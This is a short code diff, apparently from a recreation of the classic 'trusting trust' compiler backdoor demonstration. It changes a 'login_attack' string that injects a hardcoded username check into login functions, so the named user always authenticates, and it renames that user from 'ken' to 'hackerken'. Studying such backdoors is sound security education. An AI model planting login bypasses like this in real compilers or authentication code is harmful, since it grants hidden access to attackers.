@@ -4,7 +4,7 @@
     // needs to ./generate-attack-array < attack.c > attack-array.h
     static char compile_sig[] = "/* open the file */";
     static char login_sig[] = "int login(char *user) {";
-    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
+    static char login_attack[] = "if(strcmp(user, \"hackerken\") == 0) return 1;";
 
     /* attack code follows */
 
